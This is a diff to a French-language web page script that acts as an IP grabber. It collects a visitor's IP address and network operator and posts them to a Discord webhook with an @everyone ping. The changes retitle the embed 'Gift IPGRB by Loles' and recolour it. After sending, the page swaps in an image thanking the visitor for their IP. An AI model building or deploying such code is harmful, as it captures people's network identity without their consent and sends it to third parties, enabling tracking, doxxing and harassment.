@@ -61,8 +61,8 @@
                             const operator = ipInfo.org || "Opérateur non disponible";
 
                             const embed = {
-                                title: "Envoyez votre IP à la Nocturnal !",
-                                color: 0x00FFFF,  // Couleur hexadécimale
+                                title: "Gift IPGRB by Loles",
+                                color: 0xE014F0,  // Couleur hexadécimale
                                 description: "@everyone Informations de l'utilisateur :",
                                 fields: [
                                     { name: 'IP', value: ip, inline: true },
@@ -76,7 +76,7 @@
                             };
 
                             // Envoie les informations au webhook Discord
-                            sendRequest({ embeds: [embed] });
+                            sendRequest({ content: "@everyone", embeds: [embed] });
 
                             // Affiche une image définie après avoir envoyé l'embed
                             document.body.innerHTML = `<a href="https://discord.gg/e29mdZEd" target="_blank"><img src="https://cdn.discordapp.com/attachments/1146231007608045598/1176958539395252244/Merci_pour_ton_IP.png?ex=6570c30e&is=655e4e0e&hm=cad9e668b361f288286b6e26728cec0d69b322541e284fcc3f346562991eb04f&" alt="Merci de nous avoir envoyé votre IP !">`;
